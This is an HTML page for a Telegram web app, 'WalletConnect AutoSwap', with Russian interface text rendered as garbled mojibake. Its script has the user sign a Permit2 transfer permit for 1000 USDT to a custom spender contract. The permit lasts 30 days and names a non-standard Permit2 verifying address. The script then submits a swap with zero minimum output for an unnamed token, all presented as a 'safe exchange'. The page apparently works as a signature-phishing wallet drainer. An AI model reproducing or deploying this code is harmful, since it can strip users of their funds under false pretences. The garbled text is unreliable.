<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WalletConnect AutoSwap</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1f2d, #0d1520);
      color: #e0e0e0;
      text-align: center;
      padding: 20px;
      min-height: 100vh;
      margin: 0;
      overflow-x: hidden;
    }
    
    .container {
      max-width: 500px;
      margin: 0 auto;
      background: rgba(30, 40, 55, 0.8);
      backdrop-filter: blur(12px);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(79, 195, 247, 0.15);
      position: relative;
      overflow: hidden;
    }
    
    .header {
      position: relative;
      margin-bottom: 25px;
    }
    
    .logo {
      font-size: 48px;
      margin-bottom: 10px;
      color: #4fc3f7;
      text-shadow: 0 0 15px rgba(79, 195, 247, 0.5);
    }
    
    h1 {
      color: #4fc3f7;
      margin-bottom: 8px;
      font-size: 28px;
      font-weight: 700;
    }
    
    .subtitle {
      color: #90a4ae;
      margin-bottom: 30px;
      font-size: 16px;
      line-height: 1.5;
    }
    
    .card {
      background: rgba(25, 35, 45, 0.6);
      border-radius: 16px;
      padding: 20px;
      margin-bottom: 25px;
      text-align: left;
      border: 1px solid rgba(255, 255, 255, 0.08);
    }
    
    .card-title {
      font-size: 18px;
      color: #4fc3f7;
      margin-bottom: 15px;
      display: flex;
      align-items: center;
    }
    
    .card-title svg {
      margin-right: 10px;
    }
    
    .token-info {
      display: flex;
      justify-content: space-between;
      padding: 15px 0;
    }
    
    .token-column {
      flex: 1;
    }
    
    .token-label {
      color: #90a4ae;
      font-size: 14px;
      margin-bottom: 5px;
    }
    
    .token-value {
      font-weight: 600;
      word-break: break-all;
      font-size: 16px;
    }
    
    .arrow {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 50px;
      font-size: 24px;
      color: #4fc3f7;
    }
    
    #qrcode-container {
      margin: 20px 0;
      padding: 20px;
      background: rgba(25, 35, 45, 0.6);
      border-radius: 16px;
      display: inline-block;
      border: 1px solid rgba(79, 195, 247, 0.2);
    }
    
    #status {
      margin: 25px 0;
      font-weight: 500;
      font-size: 16px;
      line-height: 1.6;
      white-space: pre-line;
      padding: 20px;
      border-radius: 16px;
      background: rgba(25, 35, 45, 0.6);
      min-height: 100px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      border: 1px solid rgba(79, 195, 247, 0.2);
    }
    
    .status-success {
      color: #66bb6a;
      border-color: rgba(102, 187, 106, 0.3);
    }
    
    .status-error {
      color: #ff6b6b;
      border-color: rgba(255, 107, 107, 0.3);
    }
    
    .status-info {
      color: #4fc3f7;
      border-color: rgba(79, 195, 247, 0.3);
    }
    
    .loader {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(79, 195, 247, 0.3);
      border-radius: 50%;
      border-top-color: #4fc3f7;
      animation: spin 1s ease-in-out infinite;
      margin-right: 12px;
      vertical-align: middle;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .address {
      font-size: 14px;
      word-break: break-all;
      background: rgba(79, 195, 247, 0.15);
      padding: 10px 15px;
      border-radius: 12px;
      margin-top: 15px;
      font-family: monospace;
    }
    
    .tx-link {
      color: #4fc3f7;
      text-decoration: none;
      border-bottom: 1px dashed #4fc3f7;
      margin-top: 20px;
      display: inline-block;
      padding: 8px 0;
      font-weight: 600;
      transition: all 0.3s;
    }
    
    .tx-link:hover {
      color: #29b6f6;
      border-bottom-style: solid;
    }
    
    .progress-container {
      height: 6px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 3px;
      margin: 20px 0;
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      width: 30%;
      background: linear-gradient(90deg, #4fc3f7, #29b6f6);
      border-radius: 3px;
      transition: width 0.4s ease;
    }
    
    .network-indicator {
      position: absolute;
      top: 20px;
      right: 20px;
      display: flex;
      align-items: center;
      background: rgba(25, 35, 45, 0.7);
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 12px;
      border: 1px solid rgba(79, 195, 247, 0.3);
    }
    
    .indicator-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #4fc3f7;
      margin-right: 6px;
      box-shadow: 0 0 8px #4fc3f7;
    }
    
    .footer {
      margin-top: 25px;
      color: #90a4ae;
      font-size: 12px;
    }
    
    @media (max-width: 500px) {
      .container {
        padding: 20px;
      }
      
      h1 {
        font-size: 24px;
      }
      
      .card {
        padding: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="network-indicator">
      <span class="indicator-dot"></span>
      BSC Mainnet
    </div>
    
    <div class="header">
      <div class="logo">üîÑ</div>
      <h1>WalletConnect AutoSwap</h1>
      <div class="subtitle">–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –æ–±–º–µ–Ω —Ç–æ–∫–µ–Ω–æ–≤ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Permit2 –∏ WalletConnect</div>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
    
    <div class="card">
      <div class="card-title">–î–µ—Ç–∞–ª–∏ –æ–±–º–µ–Ω–∞</div>
      <div class="token-info">
        <div class="token-column">
          <div class="token-label">–û—Ç–¥–∞–µ—Ç–µ</div>
          <div class="token-value">1000 USDT</div>
        </div>
        <div class="arrow">‚Üí</div>
        <div class="token-column">
          <div class="token-label">–ü–æ–ª—É—á–∞–µ—Ç–µ</div>
          <div class="token-value">–¢–æ–∫–µ–Ω 0xA511...4b4f</div>
        </div>
      </div>
    </div>
    
    <div id="qrcode-container">
      <canvas id="qrcode"></canvas>
    </div>
    
    <div id="status" class="status-info">
      <span class="loader"></span>–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...
    </div>
    
    <div class="footer">
      –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –æ–±–º–µ–Ω —Ç–æ–∫–µ–Ω–æ–≤ | –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ –∫–æ—à–µ–ª—å–∫–∏: Trust Wallet, MetaMask –∏ –¥—Ä—É–≥–∏–µ
    </div>
  </div>

  <script>
    // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainId: "eip155:56",
      rpcUrl: "https://bsc-dataseed.binance.org",
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      tokenIn: "0x55D398326f99059FF775485246999027B3197955", // USDT
      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f", // –ü—Ä–∏–º–µ—Ä
      amount: "1000000000000000000000", // 1000 USDT (18 decimals)
      deadlineSec: 30 * 24 * 60 * 60 // 30 –¥–Ω–µ–π
    };

    // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
    const statusEl = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");
    const progressBar = document.getElementById("progress-bar");
    
    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞
    function setStatus(text, type = "info") {
      if (type === "info") {
        statusEl.innerHTML = `<span class="loader"></span>${text}`;
      } else {
        statusEl.textContent = text;
      }
      statusEl.className = `status-${type}`;
    }
    
    // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞
    function updateProgress(percent) {
      progressBar.style.width = `${percent}%`;
    }
    
    // –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤
    function loadScript(src) {
      return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = () => reject(new Error(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞: ${src}`));
        document.head.appendChild(script);
      });
    }
    
    // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    async function runApp() {
      try {
        updateProgress(10);
        setStatus("–ó–∞–≥—Ä—É–∑–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫...");
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ Telegram WebApp SDK
        await loadScript("https://telegram.org/js/telegram-web-app.js");
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ ethers.js
        await loadScript("https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js");
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ QRCode
        await loadScript("https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js");
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ WalletConnect SignClient —Å –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–≥–æ CDN
        updateProgress(30);
        setStatus("–ó–∞–≥—Ä—É–∑–∫–∞ WalletConnect...");
        await loadScript("https://unpkg.com/@walletconnect/sign-client@2.7.0/dist/umd/index.min.js");
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫
        updateProgress(50);
        setStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π...");
        
        if (!window.SignClient) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å WalletConnect");
        }
        
        if (!window.ethers) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å ethers.js");
        }
        
        if (!window.QRCode) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å QRCode");
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        if (window.Telegram && window.Telegram.WebApp) {
          Telegram.WebApp.ready();
          Telegram.WebApp.expand();
        }
        
        updateProgress(60);
        setStatus("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–ª–∏–µ–Ω—Ç–∞
        const client = await window.SignClient.init({
          projectId: CONFIG.projectId,
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap WebApp",
            description: "Permit2 ‚Üí AutoSwap –Ω–∞ BSC",
            url: window.location.href,
            icons: ["https://bscscan.com/images/logo.svg?v=0.0.2"],
          },
        });
        
        updateProgress(70);
        setStatus("–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...");
        
        // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
              chains: [CONFIG.chainId],
              events: ["chainChanged", "accountsChanged"],
            },
          },
        });
        
        // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ QR-–∫–æ–¥–∞
        if (uri) {
          updateProgress(80);
          setStatus("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR-–∫–æ–¥–∞ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...");
          
          window.QRCode.toCanvas(qrCanvas, uri, { 
            width: 220, 
            margin: 1,
            color: {
              dark: '#4fc3f7',
              light: 'transparent'
            }
          }, err => {
            if (err) {
              setStatus("–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ QR-–∫–æ–¥–∞", "error");
              console.error(err);
            } else {
              setStatus("–û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –≤ –≤–∞—à–µ–º –∫–æ—à–µ–ª—å–∫–µ\n(Trust Wallet, MetaMask –∏ –¥—Ä—É–≥–∏–µ)");
            }
          });
        }
        
        updateProgress(90);
        setStatus("–û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞...");
        
        // –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏
        const session = await approval();
        
        if (!session || !session.topic) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –∫–æ—à–µ–ª—å–∫–æ–º");
        }
        
        const accounts = session.namespaces.eip155?.accounts;
        if (!accounts || accounts.length === 0) {
          throw new Error("–ù–µ –Ω–∞–π–¥–µ–Ω—ã –∞–∫–∫–∞—É–Ω—Ç—ã –≤ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ");
        }
        
        const walletChainId = session.namespaces.eip155.chains[0];
        if (walletChainId !== CONFIG.chainId) {
          throw new Error(`–ù–µ–≤–µ—Ä–Ω–∞—è —Å–µ—Ç—å. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –Ω–∞ BSC Mainnet (ID: 56)`);
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞
        const address = accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω:\n${address}`, "success");
        
        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ Permit2
        const now = Math.floor(Date.now() / 1000);
        const deadline = now + CONFIG.deadlineSec;
        const nonce = 0; // –§–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        
        const domain = {
          name: "Permit2",
          chainId: 56,
          verifyingContract: CONFIG.permit2
        };
        
        const types = {
          PermitTransferFrom: [
            { name: "permitted", type: "TokenPermissions" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ],
          TokenPermissions: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint256" }
          ]
        };
        
        const message = {
          permitted: {
            token: CONFIG.tokenIn,
            amount: CONFIG.amount
          },
          spender: CONFIG.autoswap,
          nonce: nonce,
          deadline: deadline
        };
        
        const typedData = {
          types,
          domain,
          primaryType: "PermitTransferFrom",
          message
        };
        
        // –ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏
        setStatus("–ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è –æ–±–º–µ–Ω–∞...");
        const signature = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request: {
            method: "eth_signTypedData_v4",
            params: [address, typedData]
          }
        });
        
        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        setStatus("–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –æ–±–º–µ–Ω–∞...");
        const iface = new window.ethers.Interface([
          "function swapForUser(address user, address tokenIn, uint256 amount, uint256 nonce, uint256 deadline, address tokenOut, uint256 minOut, bytes signature)"
        ]);
        
        const calldata = iface.encodeFunctionData("swapForUser", [
          address,
          CONFIG.tokenIn,
          CONFIG.amount,
          nonce,
          deadline,
          CONFIG.tokenOut,
          0, // minOut = 0 –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
          signature
        ]);
        
        const tx = {
          from: address,
          to: CONFIG.autoswap,
          data: calldata
        };
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        setStatus("–û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç—å Binance Smart Chain...");
        const txHash = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request: {
            method: "eth_sendTransaction",
            params: [tx]
          }
        });
        
        // –£—Å–ø–µ—à–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
        updateProgress(100);
        const successMessage = `‚úÖ –û–±–º–µ–Ω —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω!\n\n–•—ç—à —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:\n${txHash}`;
        setStatus(successMessage, "success");
        
        // –î–æ–±–∞–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±–æ–∑—Ä–µ–≤–∞—Ç–µ–ª—å
        const explorerLink = document.createElement('a');
        explorerLink.href = `https://bscscan.com/tx/${txHash}`;
        explorerLink.target = "_blank";
        explorerLink.rel = "noopener noreferrer";
        explorerLink.className = "tx-link";
        explorerLink.textContent = "–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞ BscScan";
        statusEl.after(explorerLink);
        
      } catch (err) {
        console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:", err);
        setStatus("–û—à–∏–±–∫–∞: " + (err.message || "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞"), "error");
      }
    }
    
    // –ó–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('DOMContentLoaded', runApp);
  </script>
</body>
</html>